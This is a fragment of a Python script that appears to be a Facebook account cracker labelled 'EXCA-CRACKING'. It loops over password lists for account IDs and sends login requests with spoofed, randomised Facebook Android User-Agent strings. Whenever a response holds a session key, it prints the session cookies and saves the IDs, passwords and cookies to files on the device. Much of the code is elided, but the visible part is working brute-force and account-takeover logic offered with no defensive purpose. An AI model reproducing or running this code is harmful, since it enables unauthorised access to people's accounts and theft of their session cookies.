...
def m2(ids,names,passlist):
    ...
    try:
        ...
        try:
            ...
            ln=fn
        for pw in passlist:
            sys.stdout.write("\r\r\033[1;36m EXCA-CRACKING\033[1;35m(\033[1;37m%s\033[1;35m) \033[1;32mOK•%s \033[1;31mCP•%s"%(loop,len(oks),len(cps)));sys.stdout.flush()
            ...
            headers={
                    'User-Agent': f"[FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)};FBBV/{random.randint(20000000,80000000)};[FBAN/{fbpnnn};FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBBV/2"+str(random.randint(1000000,9999999))+";FBDM/{density=2.7,width=1080,height=4096};FBLC/en_US;FBRV/174669091;FBCR/TM;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.%s;FBDV/RMX2088;FBSV/10;FBOP/3;FBCA/arm64-v8a;]"%(fbpnn)+f" [FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)};FBBV/{random.randint(20000000,99999999)};[FBAN/{fbpnnn};FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBBV/2"+str(random.randint(10000000,99999999))+";FBDM/{density=2.7,width=1080,height=4096};FBLC/en_US;FBRV/827529373;FBCR/GLOBE;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.%s;FBDV/RMX2083;FBSV/6;FBOP/10;FBCA/armeabi-v7a;]"%(fbpnn)+f" [FBAN/FB4A;FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)};FBBV/{random.randint(20000000,99999999)};[FBAN/{fbpnnn};FBAV/{random.randint(100,300)}.0.0.{random.randint(10,20)}.{random.randint(80,150)}"+";FBBV/2"+str(random.randint(1000000,9999999))+";FBDM/{density=2.7,width=1080,height=4096};FBLC/en_US;FBRV/971810727;FBCR/TM;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.%s;FBDV/RMX2104;FBSV/11;FBOP/4;FBCA/arm64-v8a;]"%(fbpnn),
              'Content-Type': 'application/x-www-form-urlencoded', 
            ...
            if 'session_key' in req:
                ...
                rprint(f'[bold green][CREATION-DATE][/bold green] {joined(ids)}')
                print('\033[1;32m [COOKIES] \033[1;36m' + coki)
                open('/sdcard/EXCA-ALIVE.txt','a').write(ids+' | '+pas+'\n')
                open('/sdcard/EXCA-COOKIES.txt','a').write(ids+"|"+pas+"|"+coki+"\n")
                oks.append(ids)
                break
